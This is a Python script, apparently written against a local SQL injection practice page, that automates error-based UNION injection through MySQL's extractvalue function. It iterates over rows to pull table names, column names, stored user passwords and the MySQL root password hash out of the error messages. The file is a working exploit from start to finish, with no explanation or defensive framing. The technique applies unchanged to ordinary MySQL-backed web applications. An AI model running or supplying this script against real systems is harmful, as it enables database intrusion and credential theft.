from template_http import doHttp

target = 'http://localhost:8080/SqlInjectionSamples/Story3.jsp'
# Table names 
attackVector = 'select null,null,extractvalue(0x0a,concat(0x0a,(select table_name ' \
               'from information_schema.TABLES where table_schema = database() limit _1_,1)))%23'
# Column names
attackVector = 'select null,null,extractvalue(0x0a,concat(0x0a,(select column_name ' \
               'from information_schema.COLUMNS where table_schema = database() and table_name = \'APP789_USER\' limit _1_,1)))%23'
# Data
attackVector = 'select null,null,extractvalue(0x0a,concat(0x0a,(select APP789_USER_PASSWORD ' \
               'from APP789_USER order by APP789_USER_ID limit _1_,1)))%23'
# Root user password
attackVector = 'select null,null,extractvalue(0x0a,concat(0x0a,(select password ' \
               'from mysql.user where user = \'root\' limit _1_,1)))%23'
debug = 0

#req = requests.get(target)
#if req.status_code != requests.codes.ok:
#    raise ValueError('Unable to connect to target')

for i in range(500):
    try:
        newTarget = target + '?q=s\' UNION ALL ' + attackVector.replace('_1_',str(i))
        if (debug):
            print(newTarget)
        resp_text = doHttp('GET', newTarget)
        if(debug):
            print(resp_text)
        processed = str(resp_text).split("Exception occurred: XPATH syntax error:")[1]
        processed = processed.split("\n")
        processed = str(processed[1])[:-1]
        print(processed)
    except IndexError:
        break